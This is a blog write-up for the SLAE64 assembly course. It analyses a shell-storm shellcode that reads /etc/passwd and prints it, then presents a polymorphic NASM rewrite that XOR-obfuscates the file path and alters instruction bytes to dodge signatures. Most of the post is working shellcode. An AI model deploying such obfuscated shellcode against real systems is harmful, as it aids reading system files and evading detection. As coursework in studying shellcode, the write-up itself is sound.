Title: SLAE64 - Assignment 6.1
Date: 2022-07-01T19:45:25.000Z


## Disclaimer


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

[https://www.pentesteracademy.com/course?id=7](https://www.pentesteracademy.com/course?id=7)

Student ID: PA-30398

## Foreword

I chose the following shellcode samples:

<ol><li>[Read /etc/passwd - 82 bytes](https://shell-storm.org/shellcode/files/shellcode-878.php)
- [Add map in /etc/hosts file - 110 bytes](https://shell-storm.org/shellcode/files/shellcode-896.php)
- [Reads data from /etc/passwd to /tmp/outfile - 118 bytes](https://shell-storm.org/shellcode/files/shellcode-867.php)

In this part I'll create a polymorphic version of the first shellcode.

## Source Code

The files for this part of the assignment are the following:

- [original.asm](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/1/original.nasm), which contains the original shellcode
- [polymorphic.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/1/polymorphic.nasm), containing the polymorphic version of the shellcode

## Analysis

As mentioned previously, the first shellcode consists of reading the file `/etc/passwd`. At 82 bytes, it is a simple shellcode, around the length of a simple reverse shell.

Below is a snippet of code containing the assembly instructions along with some comments describing the logic in broad terms.

```nasm
; JMP-CALL-POP technique to retrieve the address of
; "/etc/passwd", stored into RDI
; 1st argument of open: pointer to the file to open
0x00000000      eb3f           jmp 0x41
0x00000002      5f             pop rdi

; XOR the byte 0x41 following the string "/etc/passwd"
; this way it turns it into a string terminator (NULL byte)
0x00000003      80770b41       xor byte [rdi + 0xb], 0x41

; syscall open
0x00000007      4831c0         xor rax, rax
0x0000000a      0402           add al, 2

; 2nd argument of read: O_RDONLY (open file in read mode)
0x0000000c      4831f6         xor rsi, rsi

; call syscall open
0x0000000f      0f05           syscall

; create a buffer of 0xfff bytes on the stack
0x00000011      6681ecff0f     sub sp, 0xfff

; 2nd argument of read: pointer to the memory location
; where to store the bytes read
0x00000016      488d3424       lea rsi, [rsp]

; 1st argument of read: file descriptor from which to read
; the bytes
0x0000001a      4889c7         mov rdi, rax

; 3rd argument of read: number of bytes to read
0x0000001d      4831d2         xor rdx, rdx
0x00000020      66baff0f       mov dx, 0xfff

; call syscall read
0x00000024      4831c0         xor rax, rax
0x00000027      0f05           syscall

; 1st argument of write: file descriptor where to write
; the bytes
0x00000029      4831ff         xor rdi, rdi
0x0000002c      4080c701       add dil, 1

; 3rd argument of write: number of bytes to write
0x00000030      4889c2         mov rdx, rax

; call syscall write
0x00000033      4831c0         xor rax, rax
0x00000036      0401           add al, 1
0x00000038      0f05           syscall

; call exit syscall
0x0000003a      4831c0         xor rax, rax
0x0000003d      043c           add al, 0x3c
0x0000003f      0f05           syscall

0x00000041      e8bcffffff     call 2

; string "/etc/passwd" followed by the byte 0x41
0x00000046      2f             invalid
0x00000047      657463         je 0xad
0x0000004a      2f             invalid
0x0000004b      7061           jo 0xae
0x0000004d      7373           jae 0xc2
0x0000004f      7764           ja 0xb5
0x00000051      41             invalid
```

<figcaption class="figure-caption">First analysis of the shellcode</figcaption>

Overall, the shellcode can be divided in these steps:

<ol><li>using the `JMP-CALL-POP` technique to obtain the address of the string `/etc/passwd`
- invoking the syscall `open` to open the previous file in read mode
- invoking the syscall `read` to read 4095 bytes, and saving them on the stack
- invoking the syscall `write` to write them to the `standard output`
- invoking the syscall `exit` to terminate the execution of the shellcode

## Polymorphism

For simplicity I chose to divide the shellcode into the following assembly routines:

- `OpenFile`
- `ReadFile`
- `WriteOutput`
- `Exit`

### OpenFile

The first routine simply opens the file `/etc/passwd`.

```nasm
global _start

section .text

_start:

OpenFile:

    xor eax, eax
    push rax

    push 0x64777373

    mov rbx, 0xcdbdc152350e17cb
    mov rcx, 0xaccdee31416b38e4
    xor rbx, rcx

    push rbx

    mov rdi, rsp
  
    add al, 2

    xor esi, esi
    syscall
```

<figcaption class="figure-caption">Opening `/etc/passwd`</figcaption>

Instead of the `JMP-CALL-POP` technique, I decided to push the string to the stack and retrieve its address through the `RSP` register.

This allowed me to decrease the number of bytes used by the shellcode, making it smaller.

Moreover, thanks to the decrement in size, I could use some of the spare bytes to obfuscate part of the strings, e.g. `/etc/passwd`.

In this case, the only clear-text part is the substring `sswd`. If you can afford some other bytes, you could probably obfuscate that one too.

### ReadFile

Since the routing for reading the bytes from `/etc/passwd` is quite short, I simply changed some of the instructions (to alter the resulting bytes) and their order.

```nasm
ReadFile:

    sub sp, 0xfff
    mov rsi, rsp

    push rax
    pop rdi

    xor eax, eax

    cdq
    mov dx, 0xfff

    syscall
```

<figcaption class="figure-caption">Reading `/etc/passwd`</figcaption>

In this case, I replaced the `LEA` (Load Effective Address) instruction with `MOV`, and replaced the next `MOV` with the `PUSH-POP` technique, which should occupy fewer bytes depending on the register used.

There's also the instruction `CDQ` (Convert Double to Quad), which allows me sign-extend `RAX` into `RDX`, thus clearing the latter if the former is positive.

### WriteOutput

In the original shellcode, the part of the code responsible for writing the contents of `/etc/passwd` to the standard output can be shrinked to its half.

In fact, it clears the `RDI` register and increases it by 1, while doing the same operations for the `RAX` register, when you could simply copy `RDI` into `RAX`.

```nasm
WriteOutput:
  
    ; call sys_write
    xor edi, edi
    inc edi
    mov rax, rdi

    syscall
```

<figcaption class="figure-caption">Writing the contents of `/etc/passwd` to `stdout`</figcaption>

### Exit

The last routine terminates the execution of the shellcode, exiting gracefully.

```nasm
Exit:

    ; call sys_exit
    push rdi
    pop rax
    add al, 59
    syscall
```

<figcaption class="figure-caption">Graceful exit</figcaption>

If you wanted to make the shellcode even smaller, you could remove this part, since it's not really necessary.

